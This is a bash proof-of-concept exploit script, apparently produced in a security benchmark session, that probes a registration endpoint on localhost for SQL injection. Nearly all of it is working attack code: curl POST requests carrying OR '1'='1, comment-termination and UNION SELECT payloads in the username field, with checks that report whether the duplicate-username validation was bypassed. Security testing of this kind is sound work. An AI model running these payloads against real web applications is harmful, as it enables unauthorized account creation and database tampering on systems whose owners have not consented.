#!/bin/bash
# POC: SQL Injection in registration endpoint username duplicate check bypass
# Target: ./repo
# Created: 2025-11-07T17:50:34.721Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# SQL Injection in Registration Username Field - Duplicate Check Bypass POC
# Target: http://localhost:8080/api/register.php
# Vulnerability: SQL injection in username parameter bypasses duplicate check

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s)

echo "=========================================="
echo "SQL Injection PoC - Registration Duplicate Check"
echo "=========================================="
echo ""

# Test 1: Verify endpoint is accessible
echo "[*] Test 1: Checking if registration endpoint is accessible..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=test&email=test@test.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 2: Register a test user to create a duplicate
echo "[*] Test 2: Registering initial test user (sqltest_${TIMESTAMP})..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=sqltest_${TIMESTAMP}&email=test_${TIMESTAMP}@example.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 3: Attempt duplicate username (should fail)
echo "[*] Test 3: Attempting to register duplicate username (should fail)..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=sqltest_${TIMESTAMP}&email=different_${TIMESTAMP}@example.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"
DUPLICATE_RESPONSE=$BODY
echo ""

# Test 4: SQL Injection bypass - OR '1'='1 payload
echo "[*] Test 4: SQL Injection bypass - OR '1'='1 payload..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=test' OR '1'='1--&email=injected_${TIMESTAMP}@example.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"

if echo "$BODY" | grep -q "success.*true"; then
  echo "[+] SUCCESS: SQL injection payload bypassed duplicate check!"
  SQLI_BYPASS_SUCCESS=1
else
  echo "[-] Payload did not bypass duplicate check"
  SQLI_BYPASS_SUCCESS=0
fi
echo ""

# Test 5: SQL comment injection bypass
echo "[*] Test 5: SQL comment injection - comment out WHERE clause..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=test_comment_${TIMESTAMP}'--&email=comment_${TIMESTAMP}@example.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"

if echo "$BODY" | grep -q "success.*true"; then
  echo "[+] SUCCESS: SQL comment payload bypassed duplicate check!"
  SQLI_COMMENT_SUCCESS=1
else
  echo "[-] Comment payload did not bypass duplicate check"
  SQLI_COMMENT_SUCCESS=0
fi
echo ""

# Test 6: UNION-based injection attempt
echo "[*] Test 6: UNION-based SQL injection..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=test' UNION SELECT NULL--&email=union_${TIMESTAMP}@example.com&password=Test123")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="

if [ $SQLI_BYPASS_SUCCESS -eq 1 ] || [ $SQLI_COMMENT_SUCCESS -eq 1 ]; then
  echo "[+] VULNERABILITY CONFIRMED: SQL Injection in duplicate username check"
  echo "[+] Payloads successfully bypassed the duplicate username validation"
  exit 0
else
  echo "[-] Could not confirm SQL injection vulnerability"
  echo "[-] Either vulnerability doesn't exist or endpoint is protected"
  exit 1
fi